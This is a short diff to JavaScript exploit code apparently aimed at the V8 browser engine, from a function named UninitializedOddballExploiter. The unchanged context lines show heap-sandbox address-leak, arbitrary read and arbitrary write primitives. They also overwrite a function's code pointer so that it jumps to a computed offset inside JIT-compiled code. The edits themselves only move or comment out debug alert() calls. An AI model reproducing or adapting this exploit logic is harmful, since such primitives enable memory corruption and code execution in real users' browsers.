@@ -244,10 +244,11 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
                   
                   helpers.set_i64(prev1);
                   var [prev_lo, _] = helpers.get_u32_pair();
-                  alert(hex(prev_hi)+hex(prev_lo));
+                  
                   // if (prev_hi == array_map || prev_lo == array_map) {
                   if(((((prev_hi >> 20) << 20) == old_space) && (prev_hi & 1 == 1)) || ((((prev_lo >> 20) << 20) == old_space) && (prev_lo & 1 == 1))){
                       alert("[+]find !");
+                      alert(hex(prev_hi)+hex(prev_lo));
                       return [i, hi == 2734n ? 0 : 1];
                   }
               }   
@@ -452,17 +453,17 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
     var foo_addr = caged_addrOf(foo);
     // %DebugPrint(foo);
     // %DebugPrint(f_x);
-    alert("[+]foo addr :" + hex(foo_addr));
+    // alert("[+]foo addr :" + hex(foo_addr));
     var code_addr = caged_arb_read(foo_addr+0x18n) & 0xffffffffn;
-    alert("[+]code addr : " + hex(code_addr));
+    // alert("[+]code addr : " + hex(code_addr));
     // // %SystemBreak();
 
     var jit_addr = caged_arb_read(code_addr+0x8n);
-    alert("[+]jit code addr : " + hex(jit_addr));
+    // alert("[+]jit code addr : " + hex(jit_addr));
     var f_x_addr = caged_addrOf(f_x);
-    alert("[+]f_x_addr : " + hex(f_x_addr));
+    // alert("[+]f_x_addr : " + hex(f_x_addr));
     var f_x_code_addr = caged_arb_read(f_x_addr+0x18n) & 0xffffffffn;
-    alert("[+]f_x_code_addr : " + hex(f_x_code_addr));
+    // alert("[+]f_x_code_addr : " + hex(f_x_code_addr));
 
     caged_arb_write(f_x_code_addr+0x8n+0x8n,jit_addr+0xb3n+0x6n);
     alert("[+]target_addr : " + hex(jit_addr+0xb3n+0x6n));
